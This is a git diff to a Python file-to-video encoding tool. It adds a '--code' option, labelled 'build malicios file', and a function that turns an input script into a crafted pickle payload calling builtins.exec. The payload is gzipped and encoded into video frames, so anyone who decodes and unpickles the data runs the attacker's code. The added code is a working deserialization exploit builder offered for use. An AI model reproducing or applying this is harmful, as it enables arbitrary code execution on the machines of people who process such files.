@@ -81,6 +81,29 @@ def get_bits_from_file(filepath, key):
     bitarray = BitArray(zip)
     return bitarray.bin
 
+def get_bits_from_exploit(filename):
+    bitarray = BitArray(filename=filename)
+
+    code = b""
+    with open(filename, "r") as file:
+        for char in file.read():
+            code += b"\\x" + hex(ord(char))[2:].zfill(2).encode()
+
+    pickled = b"cbuiltins\nexec\n(S'#'\ntR.".replace(b"#", code)
+    print('Zipping...')
+    #zip
+    out = io.BytesIO()
+    with gzip.GzipFile(fileobj=out, mode='w') as fo:
+        fo.write(pickled)
+    zip = out.getvalue()
+    #zip
+
+    del bitarray
+    del pickled
+
+    bitarray = BitArray(zip)
+    return bitarray.bin
+
 def get_bits_from_image(image):
 
     if use_cython:
@@ -242,6 +265,9 @@ def main():
     parser.add_argument(
         "-d", "--decode", help="decode file from video", action="store_true"
     )
+    parser.add_argument(
+        "-c", "--code", help="build malicios file", action="store_true"
+    )
 
     parser.add_argument("-i", "--input", help="input file", required=True)
     parser.add_argument("-o", "--output", help="output path")
@@ -258,8 +284,8 @@ def main():
     if args.framerate != FRAMERATE:
         FRAMERATE = args.framerate
 
-    if not args.decode and not args.encode:
-        raise   MissingArgument('You should use either --encode or --decode!') #check for arguments
+    if not args.decode and not args.encode and not args.code:
+        raise   MissingArgument('You should use either --encode or --decode or --code!') #check for arguments
     
     key = get_password(args.password)
     
@@ -292,4 +318,19 @@ def main():
 
         make_video(video_file_path, args.framerate)
     
+    elif args.code:
+        if (not args.framerate.isdigit() and "/" not in args.framerate) or all(x in args.framerate for x in ("-", "/")):  
+            raise NotImplementedError("The framerate must be a positive fraction or an integer for now, like 3, '1/3', or '1/5'!")
+
+        bits = get_bits_from_exploit(args.input)
+
+        make_image_sequence(bits)
+
+        video_file_path = None
+
+        if args.output:
+            video_file_path = args.output
+
+        make_video(video_file_path, args.framerate)
+
     cleanup()
